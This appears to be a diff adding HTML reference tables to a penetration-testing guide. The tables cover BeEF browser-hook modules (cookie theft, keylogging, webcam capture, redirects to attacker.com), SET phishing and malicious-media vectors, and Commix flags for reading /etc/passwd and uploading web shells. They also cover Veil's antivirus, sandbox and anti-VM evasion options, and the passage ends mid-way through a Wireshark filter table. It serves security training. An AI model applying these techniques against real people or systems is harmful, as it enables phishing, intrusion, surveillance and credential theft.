@@ -12785,6 +12785,92 @@ $ armitage                                # Launch Armitage GUI
                 </tbody>
             </table>
 
+            <h4>BeEF Command Modules Reference Table</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Module</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">Browser Information</span></td>
+                        <td>Collects comprehensive browser data: version, OS, screen resolution, plugins, timezone, language. <strong>Why:</strong> Fingerprinting the victim enables targeted exploit selection and social engineering customization based on their environment.</td>
+                        <td>First action after hooking browser; reconnaissance phase to understand victim's technical profile before launching attacks</td>
+                        <td>Commands > Browser > Hooked Domain > Get Browser Info → reveals Chrome 120 on Windows 11, identifies outdated Flash player for exploit</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Alert/Prompt Dialogs</span></td>
+                        <td>Display fake system dialogs mimicking browser alerts, OS warnings, or application prompts. <strong>Why:</strong> Social engineering through familiar UI elements exploits user trust in legitimate system notifications.</td>
+                        <td>Credential harvesting attacks; fake security warnings; testing victim's susceptibility to social engineering; creating urgency for payload delivery</td>
+                        <td>Commands > Social Engineering > Alert Dialog → "Your Windows Defender subscription expired. Click OK to renew" → user clicks → redirects to credential phish</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Page Redirect</span></td>
+                        <td>Force hooked browser to navigate to attacker-specified URL without user interaction. <strong>Why:</strong> Silently moves victims to malicious pages for drive-by downloads, phishing sites, or exploit kits.</td>
+                        <td>Delivering browser exploits; redirecting to credential harvester; moving victim to attacker-controlled domain; executing multi-stage attacks</td>
+                        <td>Commands > Browser > Hooked Domain > Redirect Browser → Set URL: http://attacker.com/exploit.html → victim browser instantly navigates to exploit page</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Cookie Theft</span></td>
+                        <td>Extracts session cookies from hooked browser's current domain and subdomains. <strong>Why:</strong> Session hijacking bypasses authentication—steal cookies to impersonate victim without knowing password.</td>
+                        <td>Accessing authenticated accounts; bypassing 2FA (if session already established); lateral movement to other services using same SSO; privilege escalation</td>
+                        <td>Commands > Browser > Hooked Domain > Get Cookie → steals banking.com cookies → attacker pastes into own browser → accesses victim's account authenticated session</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Browser Extension Detection</span></td>
+                        <td>Identifies installed browser extensions and add-ons by probing for their unique resources. <strong>Why:</strong> Discover security tools (NoScript, Privacy Badger) that may block attacks, and find vulnerable extensions to exploit.</td>
+                        <td>Pre-attack reconnaissance; adjusting exploitation techniques based on security extensions present; finding vulnerable extension versions; OPSEC assessment</td>
+                        <td>Commands > Browser > Detect Software > Detect Extensions → finds uBlock Origin v1.52.0, MetaMask wallet → attacker targets MetaMask phishing attack</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Keylogger</span></td>
+                        <td>Captures every keystroke typed in hooked browser window including passwords, credit cards, messages. <strong>Why:</strong> Passive credential harvesting without alerting user—collects data as they naturally work.</td>
+                        <td>Long-term surveillance on high-value targets; capturing credentials across multiple sites; stealing sensitive communications; financial data theft</td>
+                        <td>Commands > Logging > Keylogger → Start → victim types "password: MyS3cr3tP@ss" in online banking → attacker receives all keystrokes in BeEF panel</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Network Scanner</span></td>
+                        <td>Uses hooked browser as proxy to scan internal networks inaccessible from external attacker position. <strong>Why:</strong> Bypass firewall restrictions—internal host can reach internal network; pivoting through compromised browser.</td>
+                        <td>Mapping internal infrastructure after initial compromise; identifying additional targets; discovering internal services; preparing for lateral movement</td>
+                        <td>Commands > Network > Internal Network Fingerprinting → scan 192.168.1.0/24 → discovers 192.168.1.50:445 (SMB), 192.168.1.100:3389 (RDP) → targets for next phase</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Fake Notification Bar</span></td>
+                        <td>Creates realistic browser notification bar (like Firefox's "Flash needs updating" banner). <strong>Why:</strong> High-credibility social engineering using familiar browser UI that users trust implicitly.</td>
+                        <td>Delivering malicious updates; fake plugin installations; driving payload downloads through trusted UI elements; bypassing user skepticism</td>
+                        <td>Commands > Social Engineering > Fake Notification Bar → displays "Firefox: Install security update" → user clicks → downloads trojanized installer</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Fake Update</span></td>
+                        <td>Full-page fake software update screen (Flash Player, Java, browser, etc.) prompting download. <strong>Why:</strong> Users habitually trust update prompts—extremely effective payload delivery mechanism.</td>
+                        <td>Delivering RATs/trojans to non-technical users; initial access in phishing campaigns; capitalizing on outdated software awareness; mobile device compromise</td>
+                        <td>Commands > Social Engineering > Fake Flash Update → displays Adobe Flash update page → user downloads → executes Meterpreter reverse shell</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Screenshot</span></td>
+                        <td>Captures visual snapshot of hooked browser's current page content. <strong>Why:</strong> Steal information displayed visually but not extractable via HTML (images, PDFs, sensitive data on screen).</td>
+                        <td>Capturing displayed credentials; stealing visual documents; confirming successful exploitation; gathering intelligence from victim's browsing; proof-of-concept demonstrations</td>
+                        <td>Commands > Browser > Hooked Domain > Screenshot → captures victim viewing company financial dashboard → attacker receives PNG of confidential revenue data</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Webcam Access</span></td>
+                        <td>Requests webcam permission through browser API (HTML5), captures photos/video if granted. <strong>Why:</strong> Surveillance, identity verification for social engineering, blackmail material, intelligence gathering.</td>
+                        <td>High-value target surveillance; gathering compromising material; verifying target identity; advanced persistent threat (APT) operations; proof of physical location</td>
+                        <td>Commands > Host > Webcam > Webcam Snapshot → "Website wants to access camera" → user allows → attacker captures victim's photo for identity theft</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Persistence Mechanisms</span></td>
+                        <td>Maintains BeEF hook across page navigations, tab switches, and browser restarts. <strong>Why:</strong> Single-session hooks are fragile—persistence enables long-term access for ongoing campaigns.</td>
+                        <td>Long-term monitoring of high-value targets; ensuring continued access during multi-day engagements; surviving browser restarts; maintaining C2 channel</td>
+                        <td>Commands > Persistence > Create Alert Dialog Persistence → injects hook into localStorage → victim closes browser → reopens → still hooked to BeEF</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="warning-box">
                 <h4>⚠️ BeEF Requires Initial Access Vector</h4>
                 <p><strong>BeEF doesn't exploit browsers directly—it requires you to inject the hook first:</strong> Common injection methods: XSS vulnerabilities in web applications, compromised websites (watering hole attacks), malicious ads (malvertising), social engineering (phishing emails with links). Once hooked, BeEF provides extensive post-exploitation capabilities against that browser. <strong>Defensive considerations:</strong> Content Security Policy (CSP) headers block unauthorized script loading. NoScript and uBlock Origin browser extensions prevent hook execution. User awareness training reduces social engineering success. Regular browser updates patch vulnerabilities BeEF exploits. BeEF demonstrates that the browser is the new perimeter—clients trust websites, making client-side attacks highly effective. Modern red teams use BeEF extensively for initial access through phishing campaigns.</p>
@@ -12928,6 +13014,80 @@ $ armitage                                # Launch Armitage GUI
                         <td>1 > 2 > 5</td>
                         <td>Web Method combines multiple browser exploits for higher success rate</td>
                         <td>Browser autopwn tries all available exploits automatically</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>SET Attack Vectors Reference Table</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Attack Vector</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">Spear-Phishing Attack</span></td>
+                        <td>Targeted email campaign with malicious attachments or links tailored to specific individual/organization. <strong>Why:</strong> Personalization dramatically increases success rate—generic phishing triggers suspicion, but targeted emails exploit trust and context.</td>
+                        <td>High-value targets (executives, admins); initial access to corporate networks; exploiting researched information; bypassing technical controls through social engineering</td>
+                        <td>Menu: 1 > 1 > Attach malicious PDF → Craft email: "Q4 Financial Report from CFO" → Target opens attachment → PDF exploit delivers Meterpreter shell</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Website Attack Vector</span></td>
+                        <td>Clone legitimate websites, inject browser exploits, or harvest credentials through fake login pages. <strong>Why:</strong> Users trust familiar interfaces—perfect replica of Gmail/Office365 login bypasses skepticism.</td>
+                        <td>Credential harvesting; browser exploitation; watering hole attacks; redirecting traffic from legitimate sites; man-in-the-middle scenarios</td>
+                        <td>Menu: 1 > 2 > 3 (Credential Harvester) > 2 (Site Cloner) → Enter: https://outlook.office.com → Host phishing page → Email link → Steal credentials</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Infectious Media Generator</span></td>
+                        <td>Creates malicious USB drives, CD/DVDs with autorun payloads or file-format exploits. <strong>Why:</strong> Physical attack vector bypasses network security—users plug in found devices or accept "promotional" media.</td>
+                        <td>Physical penetration tests; targeting air-gapped networks; attacks on high-security facilities; exploiting human curiosity; bypassing network-based defenses</td>
+                        <td>Menu: 1 > 3 > Select File-Format Exploit (PDF/Office) → Generate malicious USB → Drop in parking lot → Employee plugs in → Autorun executes payload</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">PowerShell Attack</span></td>
+                        <td>Generates encoded/obfuscated PowerShell payloads bypassing execution policy and AV. <strong>Why:</strong> PowerShell is trusted system tool present on all Windows—executes directly in memory, leaving minimal forensic artifacts.</td>
+                        <td>Windows-targeted campaigns; bypassing application whitelisting; fileless malware delivery; lateral movement; executing code without touching disk</td>
+                        <td>Menu: 1 > 9 > 1 (Alphanumeric Shellcode) → Generate payload → Email: "Run this diagnostic script" → Victim executes PowerShell → Meterpreter callback</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Mass Mailer Attack</span></td>
+                        <td>Automated bulk email sending with customizable SMTP, templates, and attachments. <strong>Why:</strong> Scaling phishing campaigns from single targets to hundreds—automates delivery with legitimate-looking infrastructure.</td>
+                        <td>Large-scale phishing campaigns; testing organization-wide awareness; Red Team exercises targeting multiple departments; wide-net attacks for initial access</td>
+                        <td>Menu: 1 > 5 > Configure SMTP (Gmail/custom) → Import target list → Attach malicious file → Set template → Launch → 100+ phishing emails delivered</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">SMS Spoofing</span></td>
+                        <td>Send spoofed SMS messages (smishing) appearing from legitimate sources. <strong>Why:</strong> Mobile users less cautious than desktop—text messages have high open rates and immediate urgency perception.</td>
+                        <td>Mobile-first organizations; bypassing email filters; two-factor authentication bypass attempts; urgent delivery notifications; account verification scams</td>
+                        <td>Menu: 1 > 6 → Spoof sender: "Bank Alert" → Message: "Your account suspended. Verify: [link]" → Target clicks → Mobile credential phishing page</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Wireless Access Point</span></td>
+                        <td>Creates rogue wireless AP (Evil Twin) capturing credentials and traffic. <strong>Why:</strong> Users auto-connect to familiar SSIDs—intercept authentication and decrypt traffic from wireless clients.</td>
+                        <td>Physical proximity attacks (coffee shops, airports, conferences); corporate wireless testing; intercepting credentials; MITM attacks on wireless traffic</td>
+                        <td>Menu: 1 > 8 → Clone SSID: "Starbucks WiFi" → Victims auto-connect → Capture login credentials → Intercept HTTP traffic → Steal session cookies</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">QR Code Generator</span></td>
+                        <td>Creates QR codes linking to malicious URLs, credential harvesters, or direct payloads. <strong>Why:</strong> QR codes bypass URL scrutiny—users scan without seeing destination, trusting physical placement.</td>
+                        <td>Physical penetration tests; social engineering via printed materials; bypassing email security; mobile device targeting; conference badge attacks</td>
+                        <td>Menu: 1 > 7 → Enter phishing URL → Generate QR code → Print on flyers: "Scan for free conference WiFi" → Victims scan → Redirected to credential harvester</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Third-Party Modules</span></td>
+                        <td>Community-developed custom attack modules for emerging techniques and exploits. <strong>Why:</strong> Extends SET's capabilities beyond core vectors—leverages community research for cutting-edge attacks.</td>
+                        <td>Exploiting newly-discovered vulnerabilities; specialized industry attacks; custom payload delivery; adapting to target-specific defenses; advanced Red Team operations</td>
+                        <td>Menu: 1 > 99 → Select custom module (e.g., Office365 MFA bypass) → Configure parameters → Launch specialized attack leveraging recent vulnerability</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Multi-Attack Web</span></td>
+                        <td>Combines multiple browser exploits simultaneously (Java, Flash, browser-specific CVEs). <strong>Why:</strong> Maximizes success rate—if victim's browser immune to one exploit, another may succeed; shotgun approach.</td>
+                        <td>Uncertain target environment; maximizing initial access success; sophisticated browser exploitation; targeting diverse victim population; watering hole attacks</td>
+                        <td>Menu: 1 > 2 > 5 (Multi-Attack) → Set URL → Loads Java applet + browser exploits + plugin attacks → At least one succeeds → Delivers Metasploit payload</td>
                     </tr>
                 </tbody>
             </table>
@@ -13081,6 +13241,110 @@ $ commix --url="http://vulnerable-app.com/ping.php?ip=127.0.0.1" -p ip --file-up
                         <td>--verbose</td>
                         <td>Display detailed output including all HTTP requests/responses</td>
                         <td>commix --url="[URL]" --verbose</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>Commix Flags Reference Table</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">--url</span></td>
+                        <td>Specifies target URL containing potentially injectable parameters. <strong>Why:</strong> Entry point for testing—Commix needs to know which application and parameters to attack.</td>
+                        <td>Every Commix scan; testing web forms, search functions, API endpoints, any user-controlled input reflected in server-side commands</td>
+                        <td>commix --url="http://target.com/ping.php?ip=127.0.0.1" → Tests 'ip' parameter for command injection in ping utility interface</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--data</span></td>
+                        <td>Sends POST request data for testing parameters in request body instead of URL. <strong>Why:</strong> Many applications use POST for sensitive operations—search forms, login pages, API calls store data in body, not query string.</td>
+                        <td>Testing POST requests; web forms with method="POST"; API endpoints requiring JSON/XML; hidden parameters not visible in URL; authenticated operations</td>
+                        <td>commix --url="http://target.com/search.php" --data="query=test&category=all" -p query → Tests POST parameter 'query' in search form</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--cookie</span></td>
+                        <td>Includes HTTP cookies in requests—enables testing cookie values as injection points. <strong>Why:</strong> Applications sometimes process cookie data as commands; maintains authenticated sessions during testing.</td>
+                        <td>Testing authenticated pages requiring session cookies; applications storing user preferences in cookies; rare cookie-based injection vulnerabilities; maintaining session during scan</td>
+                        <td>commix --url="http://target.com/admin.php" --cookie="session=abc123; user=admin" → Tests if session cookie value processed by system commands</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--method</span></td>
+                        <td>Explicitly sets HTTP method (GET/POST/PUT/DELETE). <strong>Why:</strong> Forces specific request type when Commix's auto-detection fails; tests REST API methods.</td>
+                        <td>API testing requiring specific HTTP verbs; overriding auto-detection; testing HEAD/PUT/DELETE methods; debugging request issues</td>
+                        <td>commix --url="http://api.target.com/execute" --method=POST --data="cmd=ping" → Forces POST method for API endpoint testing</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--technique</span></td>
+                        <td>Specifies injection techniques: classic (output-based), eval-based (code evaluation), time-based (delay observation), file-based (writes to files). <strong>Why:</strong> Focus testing on specific technique; speed up scans; target known vulnerability type.</td>
+                        <td>Time-constrained assessments; blind injection scenarios with no output; targeting specific vulnerability class; reducing false positives; stealth testing</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --technique="time-based" → Only tests time-delay injections (e.g., sleep commands) when output suppressed</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--level</span></td>
+                        <td>Sets test thoroughness: 1=basic (100 tests), 2=moderate (500 tests), 3=extensive (2000+ tests). <strong>Why:</strong> Balance speed vs coverage—higher levels find obscure vulnerabilities but take significantly longer.</td>
+                        <td>Level 1: Quick scans, initial reconnaissance. Level 2: Standard penetration testing. Level 3: Thorough assessment, bug bounty hunting, when time permits</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --level=3 → Exhaustive testing with all payload variations, encoding, edge cases—may take hours</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--risk</span></td>
+                        <td>Controls payload aggression: 1=safe (read-only), 2=risky (may modify data), 3=heavy (may cause DoS/damage). <strong>Why:</strong> Prevents accidental damage to production systems; controls liability during authorized testing.</td>
+                        <td>Risk 1: Production systems, careful testing. Risk 2: Staging environments, standard pentests. Risk 3: Lab environments only, need full exploitation proof</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --risk=1 → Only tests safe commands like 'id', 'whoami', 'pwd'—avoids destructive operations</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--os-cmd</span></td>
+                        <td>Executes single OS command after finding injection point instead of interactive shell. <strong>Why:</strong> Quick validation; automated scripts; specific reconnaissance without full compromise.</td>
+                        <td>Proof-of-concept demonstrations; validating vulnerability existence; gathering specific information; automated scanning pipelines; non-interactive assessments</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --os-cmd="cat /etc/passwd" → If vulnerable, executes command and displays /etc/passwd contents</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--file-write</span></td>
+                        <td>Uploads arbitrary file from attacker machine to target server through command injection. <strong>Why:</strong> Write web shells, backdoors, tools—establishes persistent access beyond injection point.</td>
+                        <td>Uploading web shells for persistent access; placing reverse shell scripts; writing exploit code; establishing C2 communication; post-exploitation file transfer</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" → Uploads PHP web shell to web root</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--file-upload</span></td>
+                        <td>Combines file upload with automatic writing to web-accessible directory. <strong>Why:</strong> One-step web shell deployment—Commix handles upload and placement automatically.</td>
+                        <td>Quick web shell deployment; establishing foothold; when exact web path known; preference over manual --file-write; rapid post-exploitation</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --file-upload="/usr/share/webshells/php/php-reverse-shell.php" → Auto-uploads and places shell in web directory</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--proxy</span></td>
+                        <td>Routes all Commix traffic through HTTP/HTTPS/SOCKS proxy. <strong>Why:</strong> Anonymity through Tor/VPN; intercept traffic with Burp Suite for analysis; bypass IP-based restrictions.</td>
+                        <td>Anonymous testing; using Burp Suite for request inspection; bypassing IP whitelists; routing through pivot points; maintaining OPSEC; debugging requests</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" → Routes through Burp Proxy for request/response inspection</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--random-agent</span></td>
+                        <td>Randomizes User-Agent header with each request from large pool. <strong>Why:</strong> Evades signature-based WAF/IDS detection; bypasses User-Agent filtering; appears as different clients.</td>
+                        <td>Bypassing WAF rules; evading rate limiting; avoiding User-Agent blacklists; testing against signature-based detection; maintaining stealth</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --random-agent → Each request uses different User-Agent (Chrome, Firefox, Safari, etc.)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--tamper</span></td>
+                        <td>Applies tamper scripts to modify injection payloads—encoding, obfuscation, case manipulation. <strong>Why:</strong> Bypass WAF/IDS filters that detect standard injection patterns; evade input validation.</td>
+                        <td>Bypassing web application firewalls; evading input sanitization; defeating blacklist filters; testing obfuscated payloads; when standard injections blocked</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --tamper="space2plus,base64encode" → Encodes spaces as + and base64-encodes payloads to bypass filters</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--batch</span></td>
+                        <td>Non-interactive mode—automatically answers "yes" to all prompts. <strong>Why:</strong> Essential for automation, scripts, CI/CD pipelines; unattended scanning without manual intervention.</td>
+                        <td>Automated security scanning; CI/CD integration; scheduled vulnerability assessments; bulk testing multiple targets; running from scripts</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --batch → Runs fully automated—no prompts for confirmation, proceeds with all tests automatically</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--verbose</span></td>
+                        <td>Displays detailed output including all HTTP requests, responses, headers, injection attempts. <strong>Why:</strong> Debugging failed tests; understanding exactly what Commix tested; learning injection techniques; troubleshooting.</td>
+                        <td>Debugging scan issues; learning exploitation techniques; analyzing why injection failed; creating detailed reports; understanding application behavior</td>
+                        <td>commix --url="http://target.com/page.php?id=1" --verbose → Shows every payload: "Trying: ; whoami", "Response: 200 OK", "Detected: Linux"</td>
                     </tr>
                 </tbody>
             </table>
@@ -13474,6 +13738,91 @@ $ sha256sum /var/lib/veil/output/compiled/payload.exe
                                               # Search VirusTotal by hash (not upload!)
                                               # Uploading shares your payload with AV vendors
                                               # Check detection rate: 0/70 is excellent, <5/70 acceptable</div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Veil Option/Feature</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">Tool Selection</span></td>
+                        <td>Choose between Evasion (AV bypass payloads) or Ordnance (shellcode generation). <strong>Why:</strong> Evasion for full payload delivery, Ordnance for custom shellcode in exploits.</td>
+                        <td>Use Evasion for standalone executable delivery; Ordnance when embedding shellcode in custom exploits</td>
+                        <td>Veil > use evasion</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Language Selection</span></td>
+                        <td>Python, PowerShell, C, Go, Ruby, Perl. <strong>Why:</strong> Different languages have different AV signature coverage—less common languages evade detection better.</td>
+                        <td>PowerShell for Windows (native, fileless); Python for cross-platform; C for performance; Go for modern evasion</td>
+                        <td>use python/meterpreter/rev_tcp.py</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">MSFvenom Integration</span></td>
+                        <td>Generates Metasploit-compatible payloads with evasion layers. <strong>Why:</strong> Combines MSF functionality with Veil obfuscation for best of both worlds.</td>
+                        <td>When you need reliable Metasploit payloads (meterpreter, shell) but AV blocks standard MSFvenom output</td>
+                        <td>Payload wraps meterpreter/reverse_tcp</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Encoder Chains</span></td>
+                        <td>Multiple encoding layers (XOR, AES, base64). <strong>Why:</strong> Each layer transforms payload signature, making static detection nearly impossible.</td>
+                        <td>When single encoding fails AV scan; stack 2-3 encoders for maximum obfuscation</td>
+                        <td>XOR → AES → Base64 encoding</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Output Format</span></td>
+                        <td>EXE, DLL, Python script, PowerShell script, shellcode. <strong>Why:</strong> Different delivery scenarios require different formats.</td>
+                        <td>EXE for phishing attachments; DLL for DLL hijacking; PowerShell for in-memory execution; shellcode for exploits</td>
+                        <td>Output: payload.exe or payload.ps1</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Custom Payloads</span></td>
+                        <td>Modify template files to add unique code. <strong>Why:</strong> Stock templates eventually get signatured; custom modifications ensure uniqueness.</td>
+                        <td>For high-security targets with updated AV; when stock payloads detected; red team operations requiring stealth</td>
+                        <td>Edit /usr/share/veil/tools/evasion/payloads/</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">HTTPS Support</span></td>
+                        <td>Encrypted C2 communication over HTTPS. <strong>Why:</strong> Evades network inspection; blends with legitimate HTTPS traffic; prevents credential interception.</td>
+                        <td>Always use for production red teams; when network IDS/IPS present; egress filtering on non-standard ports</td>
+                        <td>set LHOST https://192.168.1.100:443</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Sandbox Detection</span></td>
+                        <td>Checks for VM artifacts, delays execution. <strong>Why:</strong> AV products submit suspicious files to sandboxes; detection prevents detonation.</td>
+                        <td>When targeting organizations with advanced AV (sandboxing); to prevent analysis by incident responders</td>
+                        <td>set SLEEP 90 (bypass timeout)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Anti-VM Techniques</span></td>
+                        <td>Detects virtual machine environment, refuses to run. <strong>Why:</strong> Malware analysts use VMs; prevents sandbox analysis.</td>
+                        <td>High-value targets where payload exposure risks attribution; APT simulation requiring anti-forensics</td>
+                        <td>Check CPU count, MAC addresses, registry keys</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Obfuscation Level</span></td>
+                        <td>Randomize variable names, function names, control flow. <strong>Why:</strong> Static analysis relies on patterns; randomization breaks signatures.</td>
+                        <td>Every payload generation should use maximum obfuscation; no performance penalty for evasion gain</td>
+                        <td>Automatic per-generation uniqueness</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Compiler Options</span></td>
+                        <td>Choose compiler (MinGW, PyInstaller). <strong>Why:</strong> Different compilers produce different binary signatures.</td>
+                        <td>When default compiler output flagged; cross-compilation for different architectures (x86/x64)</td>
+                        <td>PyInstaller for Python, MinGW for C</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Handler Generation</span></td>
+                        <td>Auto-generates Metasploit listener commands. <strong>Why:</strong> Eliminates manual configuration errors; ensures LHOST/LPORT match.</td>
+                        <td>After payload generation, copy-paste handler command into msfconsole to start listener</td>
+                        <td>msfconsole -x "use exploit/multi/handler; ..."</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="warning-box">
                 <h4>⚠️ Veil Limitations and AV Evasion Reality</h4>
@@ -13939,6 +14288,109 @@ Launcher: Regsvr32                        # "Squiblydoo" technique
             <h3>1. Wireshark — The Network Protocol Analyzer</h3>
             <p><strong>Wireshark is the industry-standard GUI tool for capturing and analyzing network packets.</strong> It decodes hundreds of protocols, provides powerful display filters, follows TCP/UDP streams, reconstructs files, extracts credentials, visualizes conversations, and offers deep protocol dissection. Every security professional needs Wireshark expertise for troubleshooting, forensics, and understanding network behavior at the packet level.</p>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Display Filter</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">tcp.port</span></td>
+                        <td>Filters traffic by TCP port number. Essential for isolating specific services (HTTP, SMB, SSH) from mixed traffic.</td>
+                        <td>When analyzing service-specific traffic or troubleshooting application issues on known ports.</td>
+                        <td><span class="inline-code">tcp.port == 445</span> shows SMB traffic</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ip.addr</span></td>
+                        <td>Filters traffic to/from specific IP addresses. Narrows focus to conversations involving target hosts.</td>
+                        <td>When investigating specific machines, tracking lateral movement, or analyzing host-to-host communications.</td>
+                        <td><span class="inline-code">ip.addr == 192.168.1.100</span> shows all traffic for that IP</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">http</span></td>
+                        <td>Shows all HTTP protocol traffic. Reveals cleartext web requests, responses, and potential credential exposure.</td>
+                        <td>When hunting for unencrypted credentials, analyzing web application behavior, or detecting HTTP-based attacks.</td>
+                        <td><span class="inline-code">http</span> displays HTTP traffic only</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">dns</span></td>
+                        <td>Filters DNS queries and responses. Critical for detecting data exfiltration via DNS tunneling or command-and-control communications.</td>
+                        <td>When investigating suspicious domain lookups, DNS-based exfiltration, or malware C2 channels.</td>
+                        <td><span class="inline-code">dns</span> shows all DNS traffic</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">tcp.flags</span></td>
+                        <td>Examines TCP flag combinations. Identifies connection states, scan patterns (SYN scans), and abnormal TCP behavior.</td>
+                        <td>When detecting port scans, analyzing connection establishment, or identifying TCP-based attacks.</td>
+                        <td><span class="inline-code">tcp.flags.syn == 1 && tcp.flags.ack == 0</span> shows SYN packets</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">frame.time</span></td>
+                        <td>Filters packets by timestamp. Correlates network activity with specific events or time windows.</td>
+                        <td>When investigating incidents at known times, correlating with logs, or analyzing time-based patterns.</td>
+                        <td><span class="inline-code">frame.time >= "2026-01-05 10:00:00"</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">tcp.stream</span></td>
+                        <td>Groups packets belonging to same TCP conversation. Reconstructs complete sessions for analysis.</td>
+                        <td>When following complete HTTP requests/responses, FTP sessions, or any TCP-based communication flow.</td>
+                        <td><span class="inline-code">tcp.stream eq 5</span> shows stream #5</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ip.src / ip.dst</span></td>
+                        <td>Filters by source or destination IP separately. More precise than ip.addr when direction matters.</td>
+                        <td>When tracking outbound connections from compromised hosts or inbound attacks from specific sources.</td>
+                        <td><span class="inline-code">ip.src == 10.0.0.5</span> shows traffic originating from that IP</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">tcp.analysis.retransmission</span></td>
+                        <td>Identifies retransmitted packets. Indicates network issues, packet loss, or potential DoS conditions.</td>
+                        <td>When diagnosing network performance problems, unstable connections, or flood attacks.</td>
+                        <td><span class="inline-code">tcp.analysis.retransmission</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">http.request.method</span></td>
+                        <td>Filters by HTTP method (GET, POST, PUT). POST requests often contain credentials and sensitive form data.</td>
+                        <td>When hunting for login attempts, form submissions, or API interactions that transmit data.</td>
+                        <td><span class="inline-code">http.request.method == "POST"</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ssl.handshake</span></td>
+                        <td>Shows SSL/TLS handshake packets. Reveals cipher suites, certificates, and encryption negotiation details.</td>
+                        <td>When analyzing encrypted connections, detecting weak ciphers, or investigating certificate issues.</td>
+                        <td><span class="inline-code">ssl.handshake</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">icmp</span></td>
